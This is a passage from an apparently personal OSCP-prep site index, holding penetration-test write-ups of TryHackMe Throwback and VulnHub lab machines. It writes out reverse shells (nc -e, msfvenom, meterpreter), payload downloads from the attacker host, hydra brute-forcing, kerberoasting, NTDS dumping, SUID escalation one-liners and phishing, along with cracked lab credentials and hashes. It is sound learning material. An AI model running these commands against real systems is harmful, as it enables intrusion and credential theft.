money shell at <code>/usr/share/webshells/php/php-reverse-shell.php</code></p> <p></p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#network","title":"Network","text":"<p>There are 2 interfaces</p> <p><code>lo0</code></p> <pre><code>172.19.0.1\n</code></pre> <p><code>xn0</code></p> <pre><code>10.200.70.138\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#loot","title":"Loot","text":"<p>last login in <code>login.log</code></p> <p>user</p> <pre><code>HumphreyW\n</code></pre> <p>pass</p> <pre><code>1c13639dba96c7b53d26f7d00956a364\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/","title":"Throwback-Prod","text":"<pre><code>22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)\n80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services\n5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n</code></pre> <p>Caught an NTLM hash for the user <code>PetersJ</code> using <code>responder</code></p> <p>cracked with hashcat</p> <pre><code>hashcat -m 5600 peters-hash /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule --debug-mode=1 -\n-debug-file=matched.rule\n</code></pre> <p>Password is <code>Throwback317</code></p> <p>able to log in now with</p> <pre><code>ssh PetersJ@throwback.local@10.200.70.219\n</code></pre> <p>Saved credentials</p> <pre><code>BlaireJ\n</code></pre> <pre><code>7eQgx6YzxgG3vC45t5k9\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#elevation","title":"Elevation","text":"<pre><code>runas /savecred /user:admin-petersj /profile \"cmd.exe\"\n</code></pre> <p>then set up meterpreter session as peterj-admin</p> <p>autorouting</p> <p>and socks proxy (4a)</p> <p>Now log into <code>Throwback-WS01</code> as BlaireJ</p> <pre><code>proxychains ssh BlaireJ@Throwback.local@10.200.70.222\n</code></pre> <p>Then enter the password</p> <pre><code>7eQgx6YzxgG3vC45t5k9\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#setting-up-the-proxy","title":"Setting up the proxy","text":"<pre><code>evil-winrm -u admin-petersj -H 74fb0a2ee8a066b1e372475dcbc121c5 -i 10.200.70.219\n</code></pre> <p>establish meterpreter</p> <pre><code>python3 -m http.server 444\n</code></pre> <pre><code>wget http://10.50.71.63:444/rshell-4444.exe -o shell.exe\n</code></pre> <pre><code>msfconsole -q -x \"use multi/handler\"\n</code></pre> <pre><code>set payload windows/x64/meterpreter/reverse_tcp\n</code></pre> <pre><code>set lhost tun0\n</code></pre> <pre><code>set lport 4444\n</code></pre> <pre><code>run\n</code></pre> <pre><code>./shell.exe\n</code></pre> <pre><code>run autoroute -s 10.200.70.0/24\n</code></pre> <pre><code>bg\n</code></pre> <pre><code>use auxiliary/server/socks_proxy\n</code></pre> <pre><code>run\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#setting-up-the-next-hop","title":"Setting up the next hop","text":"<pre><code>proxychains evil-winrm -u MercerH -H 5edc955e8167199d1b7d0e656da0ceea -i 10.200.70.117\n</code></pre> <pre><code>wget http://10.50.71.63:444/rshell-4445.exe -o shell.exe\n</code></pre> <pre><code>msfconsole -q -x \"use multi/handler\"\n</code></pre> <pre><code>set payload windows/x64/meterpreter/reverse_tcp\n</code></pre> <pre><code>set lhost tun0\n</code></pre> <pre><code>set lport 4445\n</code></pre> <pre><code>run\n</code></pre> <pre><code>./shell.exe\n</code></pre> <pre><code>bg\n</code></pre> <pre><code>use post/multi/manage/autoroute\n</code></pre> <pre><code>set session 1\n</code></pre> <pre><code>run\n</code></pre> <pre><code>use auxiliary/server/socks_proxy\n</code></pre> <pre><code>run\n</code></pre> <p>Current objective:  run mimikatz on Throwback-DC01 to get <code>MercerH</code> password     - Changed it to <code>Throwback2020</code></p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#pivoting-with-ssh-tunnel","title":"Pivoting with SSH tunnel","text":"<p>(example attacker - kali pwned jumpbox - debian )</p> <p>To setup a socks proxy from our kali machine on port 8080</p> <pre><code>sudo ssh -N -D localhost:8080 &lt;user&gt;@debian\n</code></pre> <p>Run stuff through the proxy proxychains.conf</p> <p><code>socks4 localhost 8080</code></p> <pre><code>proxychains &lt;command&gt;\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/","title":"Throwback-Mail","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/#port-scan","title":"Port scan","text":"<pre><code>22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))\n143/tcp open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)\n993/tcp open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)\n</code></pre> <p>On port 80, the webserver is Squirrel mail. Guest account credentials are listed here:</p> <p></p> <p>The guest account has a list of contacts, which are assumingly users on the domain:</p> <p></p> <p>Able to get a few of the passwords by attacking the mail server's login page:</p> <p></p> <p>We even did a phishing campaign (using reverse shell executable) and one of the users fell for it which gave us an administrator reverse shell.</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/Loot/","title":"Loot","text":"<p>hydra cracked these from the guest contact list.</p> <pre><code>[80][http-post-form] host: 10.200.70.232   login: PeanutbutterM    password: Summer2020\n[VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php\n[80][http-post-form] host: 10.200.70.232   login: DaviesJ    password: Management2018\n[VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php\n[80][http-post-form] host: 10.200.70.232   login: GongoH    password: Summer2020\n[VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php\n[VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php\n[80][http-post-form] host: 10.200.70.232   login: JeffersD    password: Summer2020\n[80][http-post-form] host: 10.200.70.232   login: MurphyF    password: Summer2020\n</code></pre> <p>responder hashes</p> <pre><code>[SMB] NTLMv2-SSP Client   : ::ffff:10.200.70.219\n[SMB] NTLMv2-SSP Username : THROWBACK\\PetersJ\n[SMB] NTLMv2-SSP Hash     : PetersJ::THROWBACK:7a2ed99ae94b628d:46BCDA098495DD840497B271AB1AFCFC:010100000000000080BB3BD71076D80133AD655EA83F9B8B0000000002000800550045004700340001001E00570049004E002D0034005600510035003700310047004D0046003100380004003400570049004E002D0034005600510035003700310047004D004600310038002E0055004500470034002E004C004F00430041004C000300140055004500470034002E004C004F00430041004C000500140055004500470034002E004C004F00430041004C000700080080BB3BD71076D80106000400020000000800300030000000000000000000000000200000CDD5ADC02DBE3FC910A144BC26F8BC0190D5E8A65DC06FFB157CBA1C10EC42920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00370031002E00360033000000000000000000\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/","title":"Session 7","text":"<p>Left off: Task 23</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-23","title":"Task 23","text":"<p>Bloodhound</p> <p>Install 3.x</p> <p>Set up proxy</p> <p>ssh blairej@throwback-WS01</p> <p>copy over SharpHound.ps1</p> <p>run</p> <p>Load to bloodhound</p> <p>answer questions</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-24","title":"Task 24","text":"<p>Get SPN for kerberoasting</p> <pre><code>proxychains GetUserSPNs.py -dc-ip 10.200.70.117 THrowback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9 -request\n</code></pre> <p>crack the hash</p> <pre><code>hashcat hash /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-25","title":"Task 25","text":"<p>scan the subnet with cme</p> <pre><code>proxychains crackmapexec smb 10.200.70.0/24\n</code></pre> <p>Foxyproxy</p> <p>timekeep webserver</p> <p>password reset email</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-26","title":"Task 26","text":"<p>Malicious macro</p> <p>get meterpreter</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-27","title":"Task 27","text":"<p>migrate to system</p> <p>dump hashes</p> <p>crack the new hash</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-28","title":"Task 28","text":"<p>enumerate teh db</p> <pre><code>mysql.exe -u root -p\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-29","title":"Task 29","text":"<p>cme to password spray</p> <pre><code>proxychains crackmapexec smb 10.200.70.117 -u &lt;users&gt; -p &lt;passes&gt;\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-30","title":"Task 30","text":"<p>Use bloodhound to <code>find principals with dcsync rights</code></p> <p>dump NTDS with impacket</p> <pre><code>secretsdump.py -dc-ip 10.200.70.117 Throwback/&lt;user&gt;@10.200.70.117\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%208/","title":"Session 8","text":"<p>Bloodhound</p> <p>Get SPN for kerberoasting</p> <p>timekeep webserver</p> <p>password reset email</p> <p>Malicious macro</p> <p>get meterpreter</p> <p>migrate to system</p> <p>dump hashes</p> <p>crack the new hash</p> <p>enumerate teh db</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%208/#task-29","title":"Task 29","text":"<p>cme to password spray</p> <pre><code>proxychains crackmapexec smb 10.200.70.117 -u &lt;users&gt; -p &lt;passes&gt;\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/session%208/#task-30","title":"Task 30","text":"<p>Use bloodhound to <code>find principals with dcsync rights</code></p> <p>dump NTDS with impacket</p> <pre><code>secretsdump.py -dc-ip 10.200.70.117 Throwback/&lt;user&gt;@10.200.70.117\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Assertion%20101/","title":"Assertion 101","text":"<pre><code>192.168.1.100\n</code></pre> <p>```</p>"},{"location":"OSCP-Prep/VulnHub/Cute/","title":"Cute","text":"<p>IP Address </p> <pre><code>192.168.1.191\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Cute/#open-ports","title":"Open ports","text":"<p>```open ports 22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 88/tcp  open  http     syn-ack ttl 64 nginx 1.14.2 110/tcp open  pop3     syn-ack ttl 64 Courier pop3d 995/tcp open  ssl/pop3 syn-ack ttl 64 Courier pop3d</p> <pre><code>\n## Port 80\nApache 2.4.38\n![Pasted image 20220505202925.png](&lt;./Pasted image 20220505202925.png&gt;)\n\n\n### Cute PHP/ Cute news\n\nLooks like some kind of php sandbox\n![Pasted image 20220505203313.png](&lt;./Pasted image 20220505203313.png&gt;)\n\nSoftware name\n![Pasted image 20220505203334.png](&lt;./Pasted image 20220505203334.png&gt;)\n\nCaptcha \n![Pasted image 20220505203352.png](&lt;./Pasted image 20220505203352.png&gt;)\n\nLogin screen\n![Pasted image 20220505203423.png](&lt;./Pasted image 20220505203423.png&gt;)\n\nSome migration page\n![Pasted image 20220505203520.png](&lt;./Pasted image 20220505203520.png&gt;)\n\nFailed login; username disclosure\n![Pasted image 20220505203818.png](&lt;./Pasted image 20220505203818.png&gt;)\n\n## CVE-2019-11447\n[EDB-48800](https://www.exploit-db.com/exploits/48800) is an RCE exploit for Cute 2.1.2.\n\nI had to remove `/CuteNews/` from all the URL strings. But then it gave this shell as `www-data`\n\n![Pasted image 20220506052027.png](&lt;./Pasted image 20220506052027.png&gt;)\n\n### Get a better shell\n```bash\nnc -e /bin/bash 192.168.1.112 4444\n</code></pre> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>export TERM=xterm\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Cute/#user-flag","title":"User flag","text":"<p>Becasue of bad file permissions, I am able to get the user flag as <code>www-data</code></p> <pre><code>dcb8189a0eaf7a690a67785a7299be60\n</code></pre> <p></p>"},{"location":"OSCP-Prep/VulnHub/Cute/#linpeas-findings","title":"Linpeas findings","text":"<p>Internal only ports </p> <p>No password sudo for <code>www-data</code> </p>"},{"location":"OSCP-Prep/VulnHub/Cute/#privesc","title":"Privesc","text":"<p><code>hping3</code> has the SUID bit set. https://gtfobins.github.io/gtfobins/hping3/#suid</p> <p>run the SUID binary</p> <pre><code>/usr/sbin/hping3\n</code></pre> <p>Break out into root shell</p> <pre><code>/bin/sh -p\n</code></pre> <p></p>"},{"location":"OSCP-Prep/VulnHub/Cute/#root-flag","title":"Root Flag","text":"<pre><code>0b18032c2d06d9e738ede9bc24795ff2\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Cybersploit/","title":"Cybersploit","text":""},{"location":"OSCP-Prep/VulnHub/Cybersploit/#port-scan","title":"Port scan","text":"<pre><code>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Cybersploit/#port-80","title":"Port 80","text":"<p>Homepage, none of the nav buttons appear to do anything. </p> <p>Found a username <code>itsskv</code> in the HTML comments </p> <p>Robots.txt has a long string </p> <p>Long string base64 decoded:  </p> <pre><code>Good Work !\nFlag1: cybersploit{youtube.com/c/cybersploit}\n</code></pre> <p>Now have some secret data and a username, tried logging in: </p> <pre><code>ssh itsskv@192.168.1.114\n</code></pre> <p>Password: <code>cybersploit{youtube.com/c/cybersploit}</code></p> <p>It worked</p> <p></p> <p>found another flag </p> <p></p> <p><code>cybersploit{https:t.me/cybersploit1}</code></p> <p>I tried to su to cybersploit user and to root using this flag as the password. That did not work.</p> <p>I ran linpeas and didn't see any config issues.</p> <p>The only thing that really stands out is the old linux version. Linux-exploit-suggester recommends <code>dirtycow</code>(fail),<code>dirtycow2</code>(fail), <code>overlay-fs</code>(pass)</p>"},{"location":"OSCP-Prep/VulnHub/Cybersploit/#privesc-with-overlayfs","title":"Privesc with overlayfs","text":"<p>Using edb-37292 (CVE-2015-1328) I was able to get a root shell.</p> <p></p> <p></p> <p><code>cybersploit{Z3X21CW42C4 many many congratulations !}</code></p>"},{"location":"OSCP-Prep/VulnHub/DC-1/","title":"DC-1","text":""},{"location":"OSCP-Prep/VulnHub/DC-1/#port-scan","title":"Port scan","text":"<pre><code>22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)\n80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Debian))\n111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)\n53381/tcp open  status  syn-ack ttl 64 1 (RPC #100024)\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/DC-1/#port-80-drupal-7","title":"Port 80: Drupal 7","text":"<p>Vulnerable to CVE-2018-7600</p> <p>exploit for drupal 7 &lt; 7.57</p> <pre><code>./drupa7-CVE-2018-7600.py -c whoami http://192.168.1.114:80/\n</code></pre> <p></p> <p>check the architecture</p> <p></p> <p>generate a reverse shell with</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.112 LPORT=80 -f elf -o reverse.elf \n</code></pre> <p>copy the payload over using python3 webserver and wget.</p> <p>reverse shell</p> <p></p> <p>fix it</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>export TERM=xterm\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/DC-1/#linpeas-findings","title":"Linpeas findings","text":"<p>credentials to the backend db of drupal</p> <p></p> <p>SUID set for <code>/usr/bin/find</code> exploitable with the following (sourced from GTFObins)</p> <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre> <p>got a root shell</p> <p></p> <p>There are 2 users in the db</p> <p></p> <p>Maybe I'll come back and try to recover their passwords someday.</p>"},{"location":"OSCP-Prep/VulnHub/DC-2/","title":"DC-2","text":""},{"location":"OSCP-Prep/VulnHub/DC-2/#port-scan","title":"Port Scan","text":"<pre><code>80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))\n7744/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)\n\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/DC-2/#port-80-wordpress","title":"Port 80: Wordpress","text":""},{"location":"OSCP-Prep/VulnHub/DC-2/#username-disclosure-on-the-login-screen","title":"Username disclosure on the login screen","text":"<p>existing user</p> <p></p> <p>non-existing user</p> <p></p> <p>a clue</p> <p></p> <p>nmap script scan <code>http-wordpress-users</code> found a few users.</p> <p></p> <p><code>users.txt</code> contains the users pictured above</p> <p><code>dc2-wordlists.txt</code> contains the output of this <code>cewl</code> command:</p> <pre><code>cewl http://dc-2/ -m 6 -w dc2-wordlists.txt\n</code></pre> <p>Then did a dictionary attack with the .txt files mentioned above</p> <pre><code>hydra -L users.txt -P dc2-wordlists.txt -s 80 dc-2 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;testcookie='1'&amp;wp-submit='Log+In':F=The password you entered\"\n</code></pre> <p>found 2 good sets of credentials</p> <p></p> <p><code>tom: parturient</code></p> <p><code>jerry: adipiscing</code></p> <p>another clue</p> <p></p> <p>I got impatient looking for a way to exploit wordpress, and discovered that tom is able to log in via ssh</p> <p></p> <p>BUUUUT it's an rbash shell</p> <p></p> <p>Maybe one of the available binaries will be helpful</p> <p></p> <p>was able to break out with some GTFOBins</p> <pre><code>vi\n:set shell=/bin/sh\n:shell\n</code></pre> <p></p> <p>I was able to <code>su</code> to jerry</p> <pre><code>/bin/su jerry\n</code></pre> <p>the password was the same one from wordpress <code>adipiscing</code></p> <p></p> <p>'no hints' they say. But that last line seems like a cheesy joke. Maybe SUID for <code>git</code> or something similar is going to be the root path.</p> <p>lol</p> <p></p> <p>GTFOBins to the rescue again!</p> <p>I opted for path <code>b</code> in SUDO</p> <pre><code>sudo git -p help config\n!/bin/sh\n</code></pre> <p></p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Dawn/","title":"Dawn","text":"<pre><code>192.168.1.165\n</code></pre> <pre><code>80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))\n139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\n3306/tcp open  mysql       syn-ack ttl 64 MySQL 5.5.5-10.3.15-MariaDB-1\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Dawn/#80-webserver","title":"80 - webserver","text":"<p>Appears to be an internal IT Support site which is currently under construction</p> <p></p> <p>The <code>logs</code> directory on the webserver has some files.</p> <p>I can only access <code>management.log</code></p> <p></p> <p>It looks like there are 2 files being executed on some interval:</p> <ul> <li> <p><code>product-control</code> is being executed by UID: 1000</p> </li> <li> <p><code>web-control</code> is b eing executed by UID: 33</p> </li> </ul> <p></p>"},{"location":"OSCP-Prep/VulnHub/Dawn/#139-445-smb","title":"139, 445 - SMB","text":"<p>I have Read/Write access to a share called ITDEPT. There is nothing on there but I'm able to upload stuff.</p>"},{"location":"OSCP-Prep/VulnHub/Dawn/#3306-mysql","title":"3306 - MySQL","text":"<p>There is a MariaDB server running which allows remote connections. The version is 5.5.5-10.3.15. There isa  plugin running called <code>mysql_native_password</code>. The plugin appears to be vulnerable but i haven't been able to exploit it yet. </p> <p>Then answer from this page explains the plugin. And it can be exploited with this POC.</p>"},{"location":"OSCP-Prep/VulnHub/Dawn/#exploitation","title":"Exploitation","text":"<p>The SMB Share naem is the same as hte folder from logs. So I made a reverse shell named <code>product-control</code> and uploaded it to the webserver. After a few minutes I had a shell as the user Dawn.</p> <p>Upgrade the shell</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>export TERM=xterm\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Dawn/#enumerate-dawn","title":"Enumerate Dawn","text":"<p>Lets take a look at Dawn's files</p> <p></p> <p>her bash history</p> <p></p> <p>her mysql history</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Dawn/#linpeas-findings","title":"Linpeas findings","text":"<p>/bin/zsh has the SUID bit set.</p> <p>I now have a root shell</p> <p></p> <p>Normally this is where I\"ll stop, but I wasn't satisfied. There is a still a MySQL database full of info I didn't exfiltrate.</p> <p>Tried hopping on the db as root:</p> <p></p> <p>So I need root's password. Maybe I can change it? It's dirty, but I can backup <code>/etc/shadow</code> before changing root's password then restore it to cover my tracks when I'm done</p> <p></p> <p>Hm...there was another user, maybe I can find something in their environment.</p> <p></p> <p>I ran</p> <pre><code>cat .bash_history\n</code></pre> <p>and violla! A password in cleartext!</p> <p></p> <pre><code>thisisareallysecurepasswordnooneisgoingtoeverfind\n</code></pre> <p>Now I'm able to get a proper root shell, AND explore the DB.</p> <p></p> <p>waiiiit....I still can't get into the DB.</p> <p>Going to reset the password so I can browse the DB to see what's in there.</p> <p>And I'm in</p> <p></p> <p>Also, I was able to find the root password in <code>/root/.mysql_history</code></p> <p></p> <p>There wasn't anything interesting in the database, as far as I can tell it was just a diversion. It worked, I spent way too much time trying to figure out how to exploit that dang mysql_naitive_password vulnerability, which ultimately I couldn't get to work.</p>"},{"location":"OSCP-Prep/VulnHub/Decoy/","title":"Decoy","text":"<p>Netdiscover found this one running on</p> <pre><code>192.168.1.170\n</code></pre> <p>port scan reveals port 80 and 22</p> <p>on port 80 we find a webserver which has a password protected zip file</p> <p></p> <p>we used <code>zip2john</code> and <code>john</code> to crack the password</p> <pre><code>server           (296640a3b825115a47b68fc44501c828)\n</code></pre> <p>we can ssh as the user <code>296640a3b825115a47b68fc44501c828</code> with password <code>server</code> however this is a very limited <code>rbash</code> session.</p> <p>After poking around I noticed the PATH is set to my home directory, so I used <code>scp</code> to copy over <code>/bin/sh</code> from my kali machine and was able to break out of rbash using that</p> <pre><code>sh\n</code></pre> <p>now we fix the path</p> <pre><code>PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin;export PATH\n</code></pre> <p>at this point we ended up looking at a walkthrough. There was a binary file in our home directory which gave us access to <code>chkrootkit 0.49</code> EDB-33899</p> <p>We are able to verify the software and version by looking through logs in the <code>SV-502</code> logs.</p>"},{"location":"OSCP-Prep/VulnHub/Decoy/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/Funbox%20EasyEnum/","title":"Funbox: EasyEnum","text":"<pre><code>192.168.1.136\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Funbox%20EasyEnum/#port-scan","title":"Port scan","text":"<pre><code>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))\n</code></pre> <p>Found <code>mini.php</code> which is some mini shell. I was able to upload <code>php-reverse-shell.php</code> and get a shell as www-data.</p> <p>upgrade the shell</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>export TERM=xterm\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Funbox%20EasyEnum/#privesc-from-www-data","title":"Privesc from www-data","text":"<pre><code>/etc/passwd:oracle:$1$|O@GOeN\\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash\n</code></pre> <p>dbpass=<code>tgbzhnujm</code> dbuser=<code>phpmyadmin</code></p> <p></p> <pre><code>ssh oracle@192.168.1.136\n</code></pre> <pre><code>hiphop\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Funbox%20EasyEnum/#privesc","title":"Privesc","text":"<p>linpeas discovered a few users that were previously logged in. I added their usernames to users.txt then brute forced.</p> <pre><code>hydra -u -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.136 ssh\n</code></pre> <p></p> <p>The user goat is allowed to run <code>mysql</code> with sudo privs. </p> <p></p> <p>GTFObins to the rescue.</p> <p></p> <p>Root</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Funbox%20Rookie/","title":"Funbox Rookie","text":"<pre><code>192.168.1.149\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Funbox%20Rookie/#port-scan","title":"Port scan","text":"<pre><code>21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5e\n22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))\n</code></pre> <p>ftp allows anonymous login, there are some interesting .zip flies and a .msg file which contains the message that is displayed upon login.</p> <p>I copied them all down to take a closer look.</p> <p></p> <p>using <code>unzip</code> we discover these archives are password protected.</p> <p></p> <p>Extract the hashes from each file:</p> <pre><code>for file in $(ls *.zip); do zip2john $file &gt; hashes; done\n</code></pre> <p>Then crack them:</p> <pre><code>john hashes\n</code></pre> <p></p> <p>only 2 were cracked right away. The discovered passwords can be used to unzip the archives.</p> <p>Each archive contains a private key. Tom's private key can be used for ssh authentication.</p> <pre><code>chmod 600 id_rsa\n</code></pre> <pre><code>ssh -i id_rsa tom@192.168.1.149\n</code></pre> <p></p> <p>it looks like we are in rbash</p> <p></p> <p>I was able to break out by calling bash in interactive mode:</p> <pre><code>bash -i\n</code></pre> <p>found a potential password for Tom in the .mysql_history file</p> <p></p> <p>using the newly found password, we see that Tom is allowed to sudo everything.</p> <p></p> <pre><code>sudo su\n</code></pre> <p></p>"},{"location":"OSCP-Prep/VulnHub/Funbox3/","title":"Funbox3","text":"<pre><code>192.168.1.147\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#port-scan","title":"Port Scan","text":"<pre><code>22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))\n33060/tcp open  socks5  syn-ack ttl 64\n\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#port-80-apache-webserver","title":"Port 80: Apache webserver","text":"<p>default apache page is displayed at the root</p> <p></p> <p>robots.txt was disallowing <code>/gym</code></p>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#gym","title":"/Gym","text":"<p>using LAMP not WAMP</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#crm-at-admin","title":"CRM at /admin/","text":""},{"location":"OSCP-Prep/VulnHub/Funbox3/#another-crm-at-indexphp","title":"another CRM at /index.php","text":"<p>This one has username disclosure on the forgot password dialogue</p> <p></p> <p>There's also the option to register for this one</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#bookstore-at-store","title":"Bookstore at /store/","text":"<p>If this is projectworlds online bookstore 1.0, we could use EDB-47887</p> <p></p> <p>Another login page</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#secret","title":"/secret/","text":""},{"location":"OSCP-Prep/VulnHub/Funbox3/#foothold","title":"Foothold","text":"<p>I was able to get RCE as <code>www-data</code> with EDB-47887</p> <p>The shell was sort of shitty tho, so I replaced the payload with some php from <code>/usr/share/webshells/php/php-reverse-shell.php</code></p> <p>Then I had a fully interactive shell which allowed me to cd and such.</p> <p>found <code>passwords.txt</code></p> <pre><code>ssh: yxcvbnmYYY\ngym/admin: asdfghjklXXX\n/store: admin@admin.com admin\n\n</code></pre> <p>I was able to log in as <code>tony</code> using the password he left me in his plaintext creds file.</p> <p>Tony has some interesting sudoers entries</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Funbox3/#rooted","title":"Rooted","text":""},{"location":"OSCP-Prep/VulnHub/Gaara/","title":"Gaara","text":"<pre><code>192.168.1.146\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Gaara/#port-scan","title":"Port Scan","text":"<pre><code>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 